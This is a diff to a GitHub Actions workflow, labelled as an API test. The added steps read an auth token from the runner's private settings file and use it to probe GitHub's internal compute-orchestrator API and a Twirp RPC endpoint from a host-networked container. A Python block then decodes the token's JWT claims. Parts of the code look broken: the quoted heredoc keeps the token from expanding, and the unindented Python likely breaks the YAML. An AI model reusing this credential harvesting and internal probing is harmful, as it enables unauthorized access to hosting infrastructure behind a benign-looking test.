@@ -1,4 +1,4 @@
-name: Net Test Final
+name: Accessible API Test
 on:
   push:
     branches: [master]
@@ -11,17 +11,40 @@ jobs:
           AUTH=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'])")
           API="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
           
-          # 用 dependabot 镜像（ubuntu，有 curl）
-          echo "=== 用 host 网络模式测试 ==="
+          # 用 host 网络 + 正确的路径
+          echo "=== 1. /v1/ with auth (confirmed working) ==="
           docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
             curl -sk --connect-timeout 5 \
-              -H "Authorization: Bearer $AUTH" \
-              "$API/" 2>&1
-          echo "---"
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
-            curl -sk --connect-timeout 5 \
-              -H "Authorization: Bearer $AUTH" \
-              "$API/v1/" 2>&1
+              -H "Authorization: Bearer $AUTH" "$API/v1/" 2>&1
+          
           echo ""
-          echo "=== HCA 实际 IP ==="
-          ss -tnp | grep 20.75
+          echo "=== 2. /v1/ with empty auth ==="
+          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
+            curl -sk --connect-timeout 5 "$API/v1/" 2>&1
+          
+          echo ""
+          echo "=== 3. Twirp StartPlan ==="
+          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
+            curl -sk --http2 --connect-timeout 5 \
+              -H "Authorization: Bearer $AUTH" \
+              -H "Content-Type: application/json" \
+              -d '{"planId":"test"}' \
+              "$API/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus" 2>&1
+          
+          echo ""
+          echo "=== 4. JWT key ID ==="
+          python3 << 'PYEOF'
+import base64, json
+token = "$AUTH"
+def b64d(x):
+    x += '=='[:(4-len(x)%4)%4]
+    x = x.replace('-','+').replace('_','/')
+    return base64.b64decode(x)
+h = json.loads(b64d(token.split('.')[0]))
+p = json.loads(b64d(token.split('.')[1]))
+print(f"Key ID (kid): {h.get('kid')}")
+print(f"Issuer (iss): {p.get('iss')}")
+print(f"Subject (sub): {p.get('sub')}")
+print(f"Region (reg): {p.get('reg')}")
+print(f"Env: {p.get('env')}")
+PYEOF
